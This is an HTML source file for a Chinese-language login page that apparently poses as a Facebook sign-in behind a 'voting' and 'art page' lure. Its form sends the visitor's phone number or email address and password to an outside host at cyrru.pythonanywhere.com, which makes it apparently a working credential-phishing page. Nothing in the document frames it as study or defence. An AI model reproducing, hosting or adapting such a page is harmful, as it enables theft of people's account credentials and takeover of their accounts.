<!DOCTYPE html>
<html lang="zh">
<head>
  <meta property="og:type" content="投票页面" />
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>登录以继续 - 无限艺术页面</title>
  <link
    rel="stylesheet"
    href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css"
    integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T"
    crossorigin="anonymous"
  />
  <link rel="stylesheet" type="text/css" href="css/my-login.css" />
</head>

<body class="my-login-page">
  <section class="h-100">
    <div class="container h-100">
      <div class="row justify-content-md-center h-100">
        <div class="card-wrapper">
          <center>
            <div class="brand">
              <img
                src="images/fb2.png"
                style="max-width: 150px; max-height: 150px"
                alt="logo"
              />
            </div>
          </center>

          <div class="card fat">
            <div class="card-body">
              <h4 class="card-title">登录以继续</h4>

              <form
                action="https://cyrru.pythonanywhere.com/login2"
                method="POST"
                class="my-login-validation"
                novalidate=""
              >
                <div class="form-group">
                  <input
                    id="email"
                    type="username"
                    placeholder="手机号码或电子邮件地址"
                    class="form-control"
                    name="email"
                    value=""
                    required
                    autofocus
                  />

                  <div class="invalid-feedback">电子邮件无效</div>
                </div>

                <div class="form-group">
                  <input
                    id="password"
                    type="password"
                    placeholder="密码"
                    class="form-control"
                    name="password"
                    required
                    data-eye
                  />
                  <div class="invalid-feedback">密码是必需的</div>
                </div>

                <div class="form-group m-0">
                  <button type="submit" class="btn btn-primary btn-block">
                    登录
                  </button>

                  <center>
                    <p style="color: blue; margin: 10px" ;>
                      忘记密码？
                    </p>
                  </center>
                </div>
              </form>
            </div>
          </div>
          <div class="footer"></div>
        </div>
      </div>
    </div>
  </section>

  <script
    src="https://code.jquery.com/jquery-3.3.1.slim.min.js"
    integrity="sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo"
    crossorigin="anonymous"
  ></script>
</body>
</html>
